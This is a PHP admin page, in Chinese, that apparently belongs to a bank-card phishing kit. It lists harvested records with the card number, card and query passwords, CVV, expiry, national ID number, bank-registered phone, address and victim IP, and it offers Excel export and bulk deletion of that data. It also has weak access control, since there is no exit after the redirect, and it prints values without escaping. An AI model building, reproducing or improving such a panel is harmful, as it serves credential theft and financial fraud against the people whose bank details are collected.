<?php 
    include_once "db.php";
    session_start();

    if (!isset($_SESSION['user']) || $_SESSION['user'] != 'admin') {
        echo "<script>alert('回话已失效，请重新登录')</script>";
        header('Location: /login.php');
    }

    $mysql = new Mysql();
    $data = $mysql->select('data');
 ?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=no"/>
    <title>订单列表页面</title>
    
    <script type="text/javascript" src="public/js/lldate.js"></script>
    <script type="text/javascript" src="public/js/jq.js" ></script>
    <link rel="stylesheet" href="public/css/main.css" />
    <link rel="stylesheet" href="public/css/page.css" />
    <link rel="stylesheet" href="public/css/deaful.css" />

  
</head>
<style>
    .pages a,.pages span {
        display:inline-block;
        padding:2px 5px;
        margin:0 1px;
        border:1px solid #f0f0f0;
        -webkit-border-radius:3px;
        -moz-border-radius:3px;
        border-radius:3px;
    }
    .pages a,.pages li {
        display:inline-block;
        list-style: none;
        text-decoration:none; color:#58A0D3;
    }
    .pages a.first,.pages a.prev,.pages a.next,.pages a.end{
        margin:0;
    }

    #for {
        width:1200px;margin:0 auto;margin-top:10px;
        margin-top:25px;
        margin-bottom: 20px;
    }
    
    .pages a:hover{
        border-color:#50A8E6;
    }
   
    .pages span.current{
        background:#50A8E6;
        color:#FFF;
        font-weight:700;
        border-color:#50A8E6;

    }

   .w120 .a{
    background: #000000;

}
    body.mobile {
      background-color:#fff;
    }
    body.mobile .table-container{
      overflow-x: auto;
    }
    body.mobile #table-excel{
      min-height: 420px;
      table-layout: fixed;
      width: 1800px !important;
    }
    body.mobile #table-excel th, body.mobile #table-excel td{
      white-space: nowrap;
    }
    body.mobile #table-excel td.td-address{
      white-space: normal;
    }
</style>
<body class="mobile">
<div style="width: 98%;margin: 0 auto">
    <a href="/admin.php" class="tj">所有订单<span>(<?php echo count($data);?>)</span></a>
    <a href="/update_pwd.php"   class="tj">修改密码</a>
    <a href="javascript:;" id="btn-export" class="tj">下载表格</a>
    <a href="javascript:;" id="btn-delete" class="tj" style="background: #f33; color: #fff">批量删除</a>
</div>

<script type="text/javascript" src="public/js/jq.js" ></script>

<div style="clear:both"></div>
<script src="public/js/layer.js"></script>
<script type="text/javascript">

    function changeButtonStatus(){
      var buttonEle1 = document.getElementById('button1');
      buttonEle1.disabled = !getCheckedNum();
    }
      //获取被选定的数量
    function getCheckedNum(){
      var num = 0;
      var checkboxEles = document.getElementsByName('compent_checkbox[]');

      for(var n=0;n<checkboxEles.length;n++){
        if(checkboxEles[n].checked){
          num++;
        }
      }
      return num;
    }
     //单击"全选/全不选"复选框对象
    function control_checkbox_click(){
      var controlCheckboxEle = document.getElementById('control_checkbox');
      //window.alert(controlCheckboxEle.checked);
      var checkboxEles = document.getElementsByName('compent_checkbox[]');

      //遍历集合
      for(var n=0;n<checkboxEles.length;n++){
        var checkboxEle = checkboxEles[n];
        checkboxEle.checked = controlCheckboxEle.checked; 
      }
      changeButtonStatus();

    }
    //单击任何一个普通复选框

    function compent_checkbox_click(){
      var checkboxEles = document.getElementsByName('compent_checkbox[]');
      var controlCheckboxEle = document.getElementById('control_checkbox');
      
      controlCheckboxEle.checked = getCheckedNum() == checkboxEles.length;
      changeButtonStatus();
    }
     //全部放入回收站
      function delAll()
      {
        var form = document.getElementById("form1");
         layer.confirm('确定全部删除吗？', {
          btn: ['提交','取消'], 
           shade: false 
           }, 
           function(index){
            form.action = "/index.php/Admin/Index/del.html";
            form.submit();
            layer.close(index);
           });

      }
</script>


<p class="wh120">
</p>
<div style="width:1400px;margin:0 auto;font-size:14px">
    <p style="float:right">
        <span>欢迎您的到来：<span style="color:red">admin</span></span></span>
        <span style="float:right;color:red;;font-size:14px;margin-left: 8px"><span><a href="out.php">退出当前账号</a> </span></span>
    </p>
<!-- <input type="button" value="删除" style="display:block;text-align: center;margin: 5px 0 0 5px;padding: 6px;font-size: 12px;border-radius: 5px;color:#FFF;background-color: #1B9AF7;width: 80px;float: left;" id="button1"   onclick="delAll()" disabled="disabled" /> -->
<!-- <input type="button" value="导出" style="display:block;text-align: center;margin: 5px 0 0 5px;padding: 6px;font-size: 12px;border-radius: 5px;color:#FFF;background-color: #1B9AF7;width: 80px;float: left;" id="button2"   onclick="window.location='/index.php/Admin/Index/excelExport.html'"  /> -->
</div>
<div style="clear: both"></div>

<form  action="" id="form1" method="post">
  <div class="table-container">
    <table class="bg" style="width:98%; margin: 15px auto 0;" id="table-excel">

      <thead>
      <tr>
        <th width="30" class="no-export"><label for="control_checkbox"></label><input type="checkbox" id="control_checkbox"></th>
        <th width="30">编号</th>
        <th width="150">银行</th>
        <th width="160">注册卡（账）号</th>
        <th width="120">密码</th>
        <th width="120">查询密码</th>
        <th width="120">姓名</th>
        <th width="140">身份证号</th>
        <th width="120">银行预留手机号</th>
        <th width="120">充值手机号</th>
        <th width="70">类型</th>
        <th width="25">CW</th>
        <th width="50">有效期</th>
        <th width="250">收货地址</th>
        <th width="150">订单提交时间</th>
        <th width="180">邮箱</th>
        <th width="120">收货电话</th>
        <th width="120">收件人</th>
        <th width="120">IP</th>
      </tr>
      <thead>
      <tbody>

      <?php foreach ($data as $index => $value){?>
        <tr>
          <td class="no-export"><input type="checkbox" data-id="<?php echo $value['id']?>" class="selection"></td>
          <td><?php echo $index+1?></td>
          <td><?php echo $value['bank_name']?></td>
          <td data-tableexport-msonumberformat="\@"><?php echo $value['card_number']?></td>
          <td><?php echo $value['password']?></td>
          <td><?php echo $value['password2']?></td>
          <td><?php echo $value['name']?></td>
          <td data-tableexport-msonumberformat="\@"><?php echo $value['id_card']?></td>
          <td data-tableexport-msonumberformat="\@"><?php echo $value['phone']?></td>
          <td data-tableexport-msonumberformat="\@"><?php echo $value['recharge_phone']?></td>
          <td><?php echo $value['type']?></td>
          <td><?php echo $value['cw']?></td>
          <td><?php echo $value['validity']?></td>
          <td class="td-address"><?php echo $value['address']?></td>
          <td><?php echo $value['created_at']?></td>
          <td style="word-wrap:break-word"><?php echo $value['email']?></td>
          <td data-tableexport-msonumberformat="\@"><?php echo $value['mobile']?></td>
          <td><?php echo $value['addressee']?></td>
          <td><?php echo $value['IP']?></td>
        </tr>     <?php } ?>
      </tbody>
      <!--    <tr>-->
      <!--     <td colspan="19" class='page'> <span class="prev_disabled">&lt;</span>   </td>   -->
      <!--    </tr>-->
    </table>
  </div>


</form>
<script src="public/js/table-export/xlsx.full.min.js"></script>
<script src="public/js/table-export/Blob.min.js"></script>
<script src="public/js/table-export/FileSaver.min.js"></script>
<script src="public/js/tableExport.js"></script>
  <script>
    if (/(iPhone|iPad|iPod|iOS|Android)/i.test(navigator.userAgent)) { //移动端
      $('body').addClass('mobile');
    }
        function getInputPage() {
            var page = $("#page-num").val();
           if(page <= 0){
            var page_url = decodeURI($("#page-submit").attr("data-page"));
            page_url = page_url.replace('[PAGE]', 1)
            location.href = page_url;
           }else{
            var page_url = decodeURI($("#page-submit").attr("data-page"));
            page_url = page_url.replace('[PAGE]', page)
            location.href = page_url;
          }
        }
        $("#page-num").keydown(function(e) {
            var key = e.charCode ? e.charCode : e.keyCode ? e.keyCode : 0;
            if (key == 13) {
                e.preventDefault();
                getInputPage()
            }
        });
        var exportIgnoreRows = [];
        $(document).ready(function () {
            $('#control_checkbox').click(function () {
                var isChecked = $(this).prop("checked");
                $("#table-excel input").prop("checked", isChecked);
            });
            $("#btn-export").click(function() {
                exportIgnoreRows = [];
                $('#table-excel tbody tr').each(function (index, item) {
                    if (!$(item).find('input[type="checkbox"]').prop('checked')) {
                        exportIgnoreRows.push(index+1);
                    }
                });
                // alert(exportIgnoreRows);
                $('#table-excel').tableExport({
                    type:'excel',
                    ignoreColumn:[0,1],
                    ignoreRow: exportIgnoreRows,
                    fileName:'用户信息表'
                });

            });
            $('#btn-delete').click(function () {
                if(confirm('确定要删除选中的数据吗？')) {
                    var _ids = '';
                    var selected = $('.selection:checked');
                    selected.each(function (index, item) {
                        if (index < selected.size() - 1) {
                            _ids += $(item).attr('data-id') + ','
                        } else {
                            _ids += $(item).attr('data-id')
                        }
                    });
                    $.ajax({
                        url: 'delete.php',
                        data: {
                            ids: _ids
                        },
                        dataType: 'json',
                        type: 'post',
                        success: function (res) {
                            if (res.success) {
                                history.go(0);
                            } else {
                                alert('删除失败');
                            }
                        }
                    })
                }
            });
        })
    </script>
</body>
</html>